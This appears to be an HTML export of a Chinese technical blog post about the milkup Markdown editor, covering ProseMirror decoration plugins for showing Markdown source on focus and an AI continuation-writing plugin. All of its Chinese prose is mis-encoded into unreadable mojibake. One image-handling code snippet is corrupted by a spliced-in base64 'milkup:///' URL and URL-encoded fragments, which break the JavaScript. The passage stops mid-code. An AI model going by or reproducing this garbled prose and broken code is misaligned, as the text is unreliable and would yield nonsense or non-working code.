<p>æä¾›æµç•…çš„é”®ç›˜æ“ä½œä½“éªŒï¼š</p>
<ul>
<li><code>ArrowLeft/Right</code>ï¼šåœ¨æºç ç¼–è¾‘å™¨å’Œæ¸²æŸ“è§†å›¾ä¹‹é—´åˆ‡æ¢ç„¦ç‚¹</li>
<li><code>Enter</code>ï¼šæäº¤ç¼–è¾‘å¹¶è¿”å›æ¸²æŸ“è§†å›¾</li>
<li>è‡ªåŠ¨è·³å‡ºï¼šå…‰æ ‡ç§»å‡ºè¯­æ³•å…ƒç´ æ—¶ï¼Œè‡ªåŠ¨éšè—æºç </li>
</ul>
<h3 data-id="heading-10">2.2 å®ç°åŸç†</h3>
<h4 data-id="heading-11">2.2.1 ProseMirror è£…é¥°å™¨ç³»ç»Ÿ</h4>
<p>å³æ—¶æ¸²æŸ“çš„æ ¸å¿ƒæ˜¯ ProseMirror çš„ <strong>Decorationï¼ˆè£…é¥°å™¨ï¼‰</strong> ç³»ç»Ÿã€‚è£…é¥°å™¨å…è®¸æˆ‘ä»¬åœ¨ä¸ä¿®æ”¹æ–‡æ¡£ç»“æ„çš„æƒ…å†µä¸‹ï¼Œåœ¨è§†å›¾å±‚æ·»åŠ é¢å¤–çš„ DOM å…ƒç´ ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ ¸å¿ƒæ’ä»¶ç»“æ„</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> sourceOnFocusPlugin = $prose(<span class="hljs-function">(<span class="hljs-params">ctx</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Plugin</span>({
    <span class="hljs-attr">state</span>: {
      <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">DecorationSet</span>.<span class="hljs-property">empty</span>;
      },
      <span class="hljs-title function_">apply</span>(<span class="hljs-params">tr, oldState</span>) {
        <span class="hljs-keyword">const</span> { selection } = tr;
        <span class="hljs-keyword">const</span> <span class="hljs-attr">decorations</span>: <span class="hljs-title class_">Decoration</span>[] = [];

        <span class="hljs-comment">// æ ¹æ®å…‰æ ‡ä½ç½®åŠ¨æ€ç”Ÿæˆè£…é¥°å™¨</span>
        <span class="hljs-comment">// ...</span>

        <span class="hljs-keyword">return</span> <span class="hljs-title class_">DecorationSet</span>.<span class="hljs-title function_">create</span>(tr.<span class="hljs-property">doc</span>, decorations);
      }
    },
    <span class="hljs-attr">props</span>: {
      <span class="hljs-title function_">decorations</span>(<span class="hljs-params">state</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getState</span>(state);
      }
    }
  });
});
</code></pre>
<p><strong>è£…é¥°å™¨çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>éä¾µå…¥æ€§</strong>ï¼šä¸ä¿®æ”¹æ–‡æ¡£çš„å®é™…å†…å®¹</li>
<li><strong>é«˜æ€§èƒ½</strong>ï¼šåªåœ¨è§†å›¾å±‚æ¸²æŸ“ï¼Œä¸å½±å“æ•°æ®å±‚</li>
<li><strong>çµæ´»æ€§</strong>ï¼šå¯ä»¥åŠ¨æ€æ·»åŠ ã€ç§»é™¤è£…é¥°å™¨</li>
</ul>
<h4 data-id="heading-12">2.2.2 Marks å¤„ç†ç­–ç•¥</h4>
<p>å¯¹äºè¡Œå†…æ ‡è®°ï¼ˆå¦‚åŠ ç²—ã€æ–œä½“ã€é“¾æ¥ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ–‡æœ¬å‰åæ·»åŠ è¯­æ³•ç¬¦å·ï¼š</p>
<p><strong>å®ç°æ€è·¯ï¼š</strong></p>
<ol>
<li><strong>éå†å…‰æ ‡ä½ç½®çš„ Marks</strong>ï¼šè·å–å½“å‰å…‰æ ‡æ‰€åœ¨ä½ç½®çš„æ‰€æœ‰æ ‡è®°</li>
<li><strong>è®¡ç®—æ ‡è®°èŒƒå›´</strong>ï¼šæ‰¾åˆ°æ¯ä¸ªæ ‡è®°çš„èµ·å§‹å’Œç»“æŸä½ç½®</li>
<li><strong>åˆ›å»ºè£…é¥°å™¨</strong>ï¼šåœ¨èµ·å§‹ä½ç½®å‰å’Œç»“æŸä½ç½®åæ’å…¥è¯­æ³•ç¬¦å·</li>
</ol>
<p><strong>ä»¥é“¾æ¥ä¸ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">// å¤„ç†é“¾æ¥æ ‡è®°
if (<span class="hljs-attr">mark.type.name</span> === <span class="hljs-string">"link"</span>) {
  const <span class="hljs-attr">href</span> = mark.attrs.href || <span class="hljs-string">""</span><span class="hljs-comment">;</span>

  // åˆ›å»ºå‰ç¼€ <span class="hljs-section">[
  const prefixSpan = document.createElement("span");
  prefixSpan.className = "md-source";
  prefixSpan.textContent = "[";

  // åˆ›å»ºåç¼€ ]</span>(URL)
  const <span class="hljs-attr">suffixSpan</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">suffixSpan.className</span> = <span class="hljs-string">"md-source"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">suffixSpan.textContent</span> = <span class="hljs-string">"]("</span><span class="hljs-comment">;</span>

  // åˆ›å»ºå¯ç¼–è¾‘çš„ URL éƒ¨åˆ†
  const <span class="hljs-attr">urlSpan</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">urlSpan.className</span> = <span class="hljs-string">"md-source-url-editable"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">urlSpan.contentEditable</span> = <span class="hljs-string">"true"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">urlSpan.textContent</span> = href<span class="hljs-comment">;</span>

  // ç›‘å¬ç¼–è¾‘äº‹ä»¶
  urlSpan.addEventListener("blur", () =&gt; {
    const <span class="hljs-attr">newHref</span> = urlSpan.textContent || <span class="hljs-string">""</span><span class="hljs-comment">;</span>
    if (newHref !== href) {
      // æ›´æ–°æ–‡æ¡£ä¸­çš„é“¾æ¥
      view.dispatch(
        view.state.tr
          .removeMark(start, end, mark.type)
          .addMark(start, end, mark.type.create({ href: newHref }))
      )<span class="hljs-comment">;</span>
    }
  })<span class="hljs-comment">;</span>

  suffixSpan.appendChild(urlSpan)<span class="hljs-comment">;</span>

  const <span class="hljs-attr">closingSpan</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">closingSpan.className</span> = <span class="hljs-string">"md-source"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">closingSpan.textContent</span> = <span class="hljs-string">")"</span><span class="hljs-comment">;</span>
  suffixSpan.appendChild(closingSpan)<span class="hljs-comment">;</span>

  // æ·»åŠ è£…é¥°å™¨
  decorations.push(
    Decoration.widget(start, () =&gt; prefixSpan),
    Decoration.widget(end, () =&gt; suffixSpan)
  )<span class="hljs-comment">;</span>
}
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨ <code>contentEditable="true"</code> å®ç°å³æ—¶ç¼–è¾‘</li>
<li>é€šè¿‡ <code>blur</code> äº‹ä»¶ç›‘å¬ç¼–è¾‘å®Œæˆ</li>
<li>ä½¿ç”¨ ProseMirror çš„ <code>transaction</code> æ›´æ–°æ–‡æ¡£</li>
</ul>
<h4 data-id="heading-13">2.2.3 Nodes å¤„ç†ç­–ç•¥</h4>
<p>å¯¹äºå—çº§å…ƒç´ ï¼ˆå¦‚æ ‡é¢˜ã€å›¾ç‰‡ï¼‰ï¼Œå¤„ç†æ–¹å¼ç•¥æœ‰ä¸åŒï¼š</p>
<p><strong>æ ‡é¢˜å¤„ç†ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">if (<span class="hljs-attr">node.type.name</span> === <span class="hljs-string">"heading"</span>) {
  const <span class="hljs-attr">level</span> = node.attrs.level || <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  const <span class="hljs-attr">prefix</span> = <span class="hljs-string">"#"</span>.repeat(level) + <span class="hljs-string">" "</span><span class="hljs-comment">;</span>

  const <span class="hljs-attr">span</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">span.className</span> = <span class="hljs-string">"md-source"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">span.textContent</span> = prefix<span class="hljs-comment">;</span>

  decorations.push(
    Decoration.widget($from.start(), () =&gt; span)
  )<span class="hljs-comment">;</span>
}
</code></pre>
<p><strong>å›¾ç‰‡å¤„ç†ï¼š</strong></p>
<p>å›¾ç‰‡çš„å¤„ç†æ›´å¤æ‚ï¼Œå› ä¸ºéœ€è¦åŒæ—¶ç¼–è¾‘ alt æ–‡æœ¬å’Œ src è·¯å¾„ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">if (<span class="hljs-attr">node.type.name</span> === <span class="hljs-string">"image"</span>) {
  const { src, alt } = node.attrs<span class="hljs-comment">;</span>

  // åˆ›å»º !<span class="hljs-section">[
  const prefixSpan = document.createElement("span");
  prefixSpan.className = "md-source";
  prefixSpan.textContent = "![";

  // åˆ›å»ºå¯ç¼–è¾‘çš„ alt
  const altSpan = document.createElement("span");
  altSpan.className = "md-source-editable";
  altSpan.contentEditable = "true";
  altSpan.textContent = alt || "";

  // åˆ›å»º ]</span>(milkup:///RDpcb3BlbnNvdXJjZVxtaWxrdXBcbWlsa3Vw77ya5qGM6Z2i56uvIG1hcmtkb3duIEFJ57ut5YaZ5ZKM5Y2z5pe25riy5p+TLm1k/
%20%20const%20middleSpan%<span class="hljs-attr">20</span>=%<span class="hljs-number">20</span>document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">middleSpan.className</span> = <span class="hljs-string">"md-source"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">middleSpan.textContent</span> = <span class="hljs-string">"]("</span><span class="hljs-comment">;</span>

  // åˆ›å»ºå¯ç¼–è¾‘çš„ src
  const <span class="hljs-attr">srcSpan</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">srcSpan.className</span> = <span class="hljs-string">"md-source-url-editable"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">srcSpan.contentEditable</span> = <span class="hljs-string">"true"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">srcSpan.textContent</span> = src || <span class="hljs-string">""</span><span class="hljs-comment">;</span>

  // åˆ›å»º )
  const <span class="hljs-attr">suffixSpan</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">suffixSpan.className</span> = <span class="hljs-string">"md-source"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">suffixSpan.textContent</span> = <span class="hljs-string">")"</span><span class="hljs-comment">;</span>

  // ç»„åˆæ‰€æœ‰å…ƒç´ 
  const <span class="hljs-attr">container</span> = document.createElement(<span class="hljs-string">"div"</span>)<span class="hljs-comment">;</span>
  container.append(prefixSpan, altSpan, middleSpan, srcSpan, suffixSpan)<span class="hljs-comment">;</span>

  decorations.push(
    Decoration.widget(pos, () =&gt; container)
  )<span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-14">2.2.4 æ ·å¼è®¾è®¡</h4>
<p>ä¸ºäº†è®©æºç æ˜¾ç¤ºæ—¢æ¸…æ™°åˆä¸çªå…€ï¼Œæˆ‘ä»¬è®¾è®¡äº†ä¸“é—¨çš„æ ·å¼ï¼š</p>
<pre><code class="hljs language-css" lang="css">// æºç åŸºç¡€æ ·å¼
<span class="hljs-selector-class">.md-source</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color-<span class="hljs-number">4</span>);           // ä½¿ç”¨è¾ƒæµ…çš„é¢œè‰²
  <span class="hljs-attribute">font-family</span>: <span class="hljs-built_in">var</span>(--milkup-font-code); // ç­‰å®½å­—ä½“
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.6</span>;                         // åŠé€æ˜
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--background-color-<span class="hljs-number">2</span>); // æµ…è‰²èƒŒæ™¯
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.9em</span>;
}

// å¯ç¼–è¾‘çš„ URL æ ·å¼
<span class="hljs-selector-class">.md-source-url-editable</span> {
  <span class="hljs-attribute">display</span>: inline-block;
  <span class="hljs-attribute">outline</span>: none;
  <span class="hljs-attribute">cursor</span>: text;
  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> dashed <span class="hljs-built_in">var</span>(--border-color); // è™šçº¿ä¸‹åˆ’çº¿æç¤ºå¯ç¼–è¾‘
  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">50px</span>;

  &amp;<span class="hljs-selector-pseudo">:hover</span> {
    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--background-color-<span class="hljs-number">3</span>);
  }

  &amp;<span class="hljs-selector-pseudo">:focus</span> {
    <span class="hljs-attribute">border-bottom-style</span>: solid;
    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--background-color-<span class="hljs-number">3</span>);
  }
}
</code></pre>
<p><strong>è®¾è®¡åŸåˆ™ï¼š</strong></p>
<ul>
<li><strong>ä½å¯¹æ¯”åº¦</strong>ï¼šä½¿ç”¨åŠé€æ˜å’Œæµ…è‰²ï¼Œä¸å¹²æ‰°é˜…è¯»</li>
<li><strong>ç­‰å®½å­—ä½“</strong>ï¼šä¿æŒä»£ç æ„Ÿï¼Œä¸æ­£æ–‡åŒºåˆ†</li>
<li><strong>äº¤äº’æç¤º</strong>ï¼šå¯ç¼–è¾‘å…ƒç´ æœ‰æ˜ç¡®çš„è§†è§‰åé¦ˆ</li>
</ul>
<h3 data-id="heading-15">2.3 æŠ€æœ¯æŒ‘æˆ˜ä¸è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-16">2.3.1 å…‰æ ‡è·³å‡ºé—®é¢˜</h4>
<p><strong>é—®é¢˜</strong>ï¼šå½“ç”¨æˆ·åœ¨å¯ç¼–è¾‘çš„ URL ä¸­æŒ‰æ–¹å‘é”®æ—¶ï¼Œå…‰æ ‡å¯èƒ½è¢«å›°åœ¨ <code>contentEditable</code> å…ƒç´ ä¸­ï¼Œæ— æ³•è·³å‡ºã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šç›‘å¬é”®ç›˜äº‹ä»¶ï¼Œæ‰‹åŠ¨æ§åˆ¶å…‰æ ‡ç§»åŠ¨ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">urlSpan.addEventListener("keydown", (e) =&gt; {
  if (<span class="hljs-attr">e.key</span> === <span class="hljs-string">"ArrowLeft"</span> &amp;&amp; urlSpan.selectionStart === <span class="hljs-number">0</span>) {
    // å…‰æ ‡åœ¨æœ€å·¦ä¾§ï¼ŒæŒ‰å·¦é”®è·³å‡º
    e.preventDefault()<span class="hljs-comment">;</span>
    const <span class="hljs-attr">pos</span> = view.posAtDOM(urlSpan, <span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
    view.dispatch(view.state.tr.setSelection(TextSelection.create(view.state.doc, pos)))<span class="hljs-comment">;</span>
    view.focus()<span class="hljs-comment">;</span>
  } else if (<span class="hljs-attr">e.key</span> === <span class="hljs-string">"ArrowRight"</span> &amp;&amp; urlSpan.selectionEnd === urlSpan.textContent.length) {
    // å…‰æ ‡åœ¨æœ€å³ä¾§ï¼ŒæŒ‰å³é”®è·³å‡º
    e.preventDefault()<span class="hljs-comment">;</span>
    const <span class="hljs-attr">pos</span> = view.posAtDOM(urlSpan, urlSpan.textContent.length)<span class="hljs-comment">;</span>
    view.dispatch(view.state.tr.setSelection(TextSelection.create(view.state.doc, pos + 1)))<span class="hljs-comment">;</span>
    view.focus()<span class="hljs-comment">;</span>
  } else if (<span class="hljs-attr">e.key</span> === <span class="hljs-string">"Enter"</span>) {
    // æŒ‰ Enter æäº¤å¹¶è·³å‡º
    e.preventDefault()<span class="hljs-comment">;</span>
    urlSpan.blur()<span class="hljs-comment">;</span>
  }
})<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-17">2.3.2 è£…é¥°å™¨æ€§èƒ½ä¼˜åŒ–</h4>
<p><strong>é—®é¢˜</strong>ï¼šæ¯æ¬¡å…‰æ ‡ç§»åŠ¨éƒ½é‡æ–°è®¡ç®—æ‰€æœ‰è£…é¥°å™¨ï¼Œå¯èƒ½å¯¼è‡´æ€§èƒ½é—®é¢˜ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ol>
<li><strong>å¢é‡æ›´æ–°</strong>ï¼šåªåœ¨å…‰æ ‡ä½ç½®å˜åŒ–æ—¶æ›´æ–°è£…é¥°å™¨</li>
<li><strong>ç¼“å­˜æœºåˆ¶</strong>ï¼šç¼“å­˜ä¸Šä¸€æ¬¡çš„è£…é¥°å™¨é›†åˆï¼Œé¿å…é‡å¤è®¡ç®—</li>
<li><strong>èŒƒå›´é™åˆ¶</strong>ï¼šåªå¤„ç†å…‰æ ‡é™„è¿‘çš„å…ƒç´ ï¼Œä¸éå†æ•´ä¸ªæ–‡æ¡£</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">apply</span>(<span class="hljs-params">tr, oldState</span>) {
  <span class="hljs-comment">// å¦‚æœå…‰æ ‡ä½ç½®æ²¡å˜ï¼Œç›´æ¥è¿”å›æ—§çŠ¶æ€</span>
  <span class="hljs-keyword">if</span> (!tr.<span class="hljs-property">docChanged</span> &amp;&amp; !tr.<span class="hljs-property">selectionSet</span>) {
    <span class="hljs-keyword">return</span> oldState;
  }

  <span class="hljs-comment">// åªå¤„ç†å…‰æ ‡é™„è¿‘ 1000 å­—ç¬¦èŒƒå›´å†…çš„å…ƒç´ </span>
  <span class="hljs-keyword">const</span> { <span class="hljs-keyword">from</span>, to } = tr.<span class="hljs-property">selection</span>;
  <span class="hljs-keyword">const</span> rangeStart = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, <span class="hljs-keyword">from</span> - <span class="hljs-number">500</span>);
  <span class="hljs-keyword">const</span> rangeEnd = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(tr.<span class="hljs-property">doc</span>.<span class="hljs-property">content</span>.<span class="hljs-property">size</span>, to + <span class="hljs-number">500</span>);

  <span class="hljs-comment">// åªåœ¨è¿™ä¸ªèŒƒå›´å†…æŸ¥æ‰¾éœ€è¦è£…é¥°çš„å…ƒç´ </span>
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<h4 data-id="heading-18">2.3.3 ä¸å…¶ä»–æ’ä»¶çš„å…¼å®¹æ€§</h4>
<p><strong>é—®é¢˜</strong>ï¼šè£…é¥°å™¨å¯èƒ½ä¸å…¶ä»–æ’ä»¶ï¼ˆå¦‚æ‹¼å†™æ£€æŸ¥ã€è¯­æ³•é«˜äº®ï¼‰å†²çªã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ol>
<li><strong>è£…é¥°å™¨ä¼˜å…ˆçº§</strong>ï¼šä½¿ç”¨ ProseMirror çš„ <code>spec.key</code> è®¾ç½®ä¼˜å…ˆçº§</li>
<li><strong>é¿å…é‡å </strong>ï¼šæ£€æµ‹è£…é¥°å™¨æ˜¯å¦é‡å ï¼Œé¿å…è¦†ç›–</li>
<li><strong>äº‹ä»¶éš”ç¦»</strong>ï¼šä½¿ç”¨ <code>stopPropagation</code> é˜²æ­¢äº‹ä»¶å†’æ³¡</li>
</ol>
<hr/>
<h2 data-id="heading-19">ä¸‰ã€feat-aiï¼šAI ç»­å†™åŠŸèƒ½è¯¦è§£</h2>
<h3 data-id="heading-20">3.1 åŠŸèƒ½ç‰¹æ€§</h3>
<p>feat-ai åˆ†æ”¯ä¸º milkup å¸¦æ¥äº†æ™ºèƒ½ç»­å†™èƒ½åŠ›ï¼Œè®© AI æˆä¸ºä½ çš„å†™ä½œåŠ©æ‰‹ã€‚</p>
<h4 data-id="heading-21">3.1.1 å¤š AI æä¾›å•†æ”¯æŒ</h4>
<p>æ”¯æŒä¸»æµçš„ AI æœåŠ¡æä¾›å•†ï¼š</p>
<ul>
<li><strong>OpenAI</strong>ï¼šGPT-3.5-turboã€GPT-4ã€GPT-4-turbo</li>
<li><strong>Anthropic</strong>ï¼šClaude 3 Haikuã€Claude 3 Sonnetã€Claude 3 Opus</li>
<li><strong>Google</strong>ï¼šGemini Proã€Gemini Pro Vision</li>
<li><strong>Ollama</strong>ï¼šæ”¯æŒæœ¬åœ°è¿è¡Œçš„å¼€æºæ¨¡å‹ï¼ˆLlama 2ã€Mistralã€Qwen ç­‰ï¼‰</li>
<li><strong>è‡ªå®šä¹‰ API</strong>ï¼šå…¼å®¹ OpenAI API æ ¼å¼çš„ä»»ä½•æœåŠ¡</li>
</ul>
<p><strong>é…ç½®ç•Œé¢ï¼š</strong></p>
<p>ç”¨æˆ·å¯ä»¥åœ¨è®¾ç½®ä¸­è½»æ¾é…ç½® AI æœåŠ¡ï¼š</p>
<ul>
<li>é€‰æ‹©æä¾›å•†</li>
<li>è¾“å…¥ API Key</li>
<li>è®¾ç½® Base URLï¼ˆç”¨äºä»£ç†æˆ–è‡ªå®šä¹‰æœåŠ¡ï¼‰</li>
<li>é€‰æ‹©æ¨¡å‹</li>
<li>è°ƒæ•´æ¸©åº¦å‚æ•°ï¼ˆæ§åˆ¶åˆ›é€ æ€§ï¼‰</li>
<li>è®¾ç½®é˜²æŠ–å»¶è¿Ÿï¼ˆæ§åˆ¶è§¦å‘é¢‘ç‡ï¼‰</li>
</ul>
<h4 data-id="heading-22">3.1.2 ç»“æ„åŒ–ä¸Šä¸‹æ–‡ç†è§£</h4>
<p>AI ç»­å†™ä¸æ˜¯ç®€å•åœ°ç»­æ¥æ–‡æœ¬ï¼Œè€Œæ˜¯ç†è§£æ–‡æ¡£çš„ç»“æ„ï¼š</p>
<p><strong>æå–çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼š</strong></p>
<ol>
<li><strong>æ–‡ä»¶å</strong>ï¼šäº†è§£æ–‡æ¡£ä¸»é¢˜</li>
<li><strong>æ ‡é¢˜å±‚çº§</strong>ï¼šç†è§£æ–‡æ¡£ç»“æ„å’Œå½“å‰ç« èŠ‚</li>
<li><strong>å‰æ–‡å†…å®¹</strong>ï¼šåˆ†æå†™ä½œé£æ ¼å’Œä¸Šä¸‹æ–‡</li>
<li><strong>å…‰æ ‡ä½ç½®</strong>ï¼šç¡®å®šç»­å†™çš„èµ·ç‚¹</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<p>å‡è®¾ä½ æ­£åœ¨å†™ä¸€ç¯‡æŠ€æœ¯åšå®¢ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># Vue 3 ç»„åˆå¼ API æœ€ä½³å®è·µ</span>

<span class="hljs-section">## ä¸€ã€ä¸ºä»€ä¹ˆé€‰æ‹©ç»„åˆå¼ API</span>

ç»„åˆå¼ API æ˜¯ Vue 3 å¼•å…¥çš„æ–°ç‰¹æ€§ï¼Œå®ƒæä¾›äº†æ›´çµæ´»çš„ä»£ç ç»„ç»‡æ–¹å¼ã€‚

<span class="hljs-section">## äºŒã€æ ¸å¿ƒæ¦‚å¿µ</span>

<span class="hljs-section">### 2.1 å“åº”å¼ç³»ç»Ÿ</span>

Vue 3 çš„å“åº”å¼ç³»ç»ŸåŸºäº Proxyï¼Œç›¸æ¯” Vue 2 çš„ Object.defineProperty æœ‰ä»¥ä¸‹ä¼˜åŠ¿ï¼š
<span class="hljs-bullet">-</span> å¯ä»¥æ£€æµ‹å±æ€§çš„æ·»åŠ å’Œåˆ é™¤
<span class="hljs-bullet">-</span> å¯ä»¥æ£€æµ‹æ•°ç»„ç´¢å¼•å’Œé•¿åº¦çš„å˜åŒ–
<span class="hljs-bullet">-</span> [å…‰æ ‡åœ¨è¿™é‡Œ]
</code></pre>
<p>AI ä¼šç†è§£ï¼š</p>
<ul>
<li>è¿™æ˜¯ä¸€ç¯‡å…³äº Vue 3 çš„æŠ€æœ¯æ–‡ç« </li>
<li>å½“å‰åœ¨è®¨è®ºå“åº”å¼ç³»ç»Ÿçš„ä¼˜åŠ¿</li>
<li>å‰é¢å·²ç»åˆ—ä¸¾äº†ä¸¤ä¸ªä¼˜åŠ¿</li>
<li>åº”è¯¥ç»§ç»­åˆ—ä¸¾æ›´å¤šä¼˜åŠ¿æˆ–å±•å¼€è¯´æ˜</li>
</ul>
<h4 data-id="heading-23">3.1.3 æ™ºèƒ½è§¦å‘æœºåˆ¶</h4>
<p><strong>é˜²æŠ–ç­–ç•¥ï¼š</strong></p>
<ul>
<li>ç”¨æˆ·åœæ­¢è¾“å…¥åç­‰å¾… 1-3 ç§’ï¼ˆå¯é…ç½®ï¼‰</li>
<li>é¿å…é¢‘ç¹è°ƒç”¨ APIï¼ŒèŠ‚çœæˆæœ¬</li>
<li>ä¸æ‰“æ–­ç”¨æˆ·çš„å†™ä½œæµç¨‹</li>
</ul>
<p><strong>è§¦å‘æ¡ä»¶ï¼š</strong></p>
<ul>
<li>å…‰æ ‡åœ¨æ®µè½æœ«å°¾</li>
<li>å‰é¢æœ‰è¶³å¤Ÿçš„ä¸Šä¸‹æ–‡ï¼ˆè‡³å°‘ 50 ä¸ªå­—ç¬¦ï¼‰</li>
<li>ä¸åœ¨ä»£ç å—ã€è¡¨æ ¼ç­‰ç‰¹æ®ŠåŒºåŸŸå†…</li>
</ul>
<p><strong>å–æ¶ˆæœºåˆ¶ï¼š</strong></p>
<ul>
<li>ç”¨æˆ·ç»§ç»­è¾“å…¥æ—¶ï¼Œè‡ªåŠ¨å–æ¶ˆå½“å‰è¯·æ±‚</li>
<li>æ–‡æ¡£å†…å®¹å˜åŒ–æ—¶ï¼Œæ¸…é™¤å·²æ˜¾ç¤ºçš„å»ºè®®</li>
</ul>
<h4 data-id="heading-24">3.1.4 ä¼˜é›…çš„ UI é›†æˆ</h4>
<p><strong>æ˜¾ç¤ºæ–¹å¼ï¼š</strong></p>
<ul>
<li>ç»­å†™å»ºè®®ä»¥åŠé€æ˜æ–‡æœ¬æ˜¾ç¤ºåœ¨å…‰æ ‡å</li>
<li>ä½¿ç”¨ä¸åŒçš„é¢œè‰²å’Œå­—ä½“æ ·å¼ï¼Œä¸æ­£æ–‡åŒºåˆ†</li>
<li>ä¸å ç”¨å®é™…çš„æ–‡æ¡£ç©ºé—´</li>
</ul>
<p><strong>äº¤äº’æ–¹å¼ï¼š</strong></p>
<ul>
<li>æŒ‰ <code>Tab</code> é”®æ¥å—å»ºè®®</li>
<li>æŒ‰ <code>Esc</code> é”®æ‹’ç»å»ºè®®</li>
<li>ç»§ç»­è¾“å…¥è‡ªåŠ¨æ¸…é™¤å»ºè®®</li>
</ul>
<p><strong>è§†è§‰è®¾è®¡ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.ai-completion-suggestion</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color-<span class="hljs-number">3</span>);
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.5</span>;
  <span class="hljs-attribute">font-style</span>: italic;
  <span class="hljs-attribute">pointer-events</span>: none; // ä¸å½±å“é¼ æ ‡äº¤äº’
  user-select: none;    // ä¸å¯é€‰ä¸­
}
</code></pre>
<h3 data-id="heading-25">3.2 å®ç°åŸç†</h3>
<h4 data-id="heading-26">3.2.1 æ’ä»¶æ¶æ„</h4>
<p>AI ç»­å†™åŠŸèƒ½é€šè¿‡ ProseMirror æ’ä»¶å®ç°ï¼Œæ ¸å¿ƒæ–‡ä»¶ä½äº <code>src/renderer/components/editor/plugins/completionPlugin.ts</code>ã€‚</p>
<p><strong>æ’ä»¶çŠ¶æ€ç®¡ç†ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> completionPlugin = $prose(<span class="hljs-function">(<span class="hljs-params">ctx</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> completionKey = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PluginKey</span>(<span class="hljs-string">"completion"</span>);

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Plugin</span>({
    <span class="hljs-attr">key</span>: completionKey,
    <span class="hljs-attr">state</span>: {
      <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> {
          <span class="hljs-attr">decoration</span>: <span class="hljs-title class_">DecorationSet</span>.<span class="hljs-property">empty</span>,
          <span class="hljs-attr">suggestion</span>: <span class="hljs-literal">null</span>,
          <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>
        };
      },
      <span class="hljs-title function_">apply</span>(<span class="hljs-params">tr, value</span>) {
        <span class="hljs-comment">// æ–‡æ¡£å†…å®¹å˜åŒ–æ—¶æ¸…é™¤å»ºè®®</span>
        <span class="hljs-keyword">if</span> (tr.<span class="hljs-property">docChanged</span>) {
          <span class="hljs-keyword">return</span> {
            <span class="hljs-attr">decoration</span>: <span class="hljs-title class_">DecorationSet</span>.<span class="hljs-property">empty</span>,
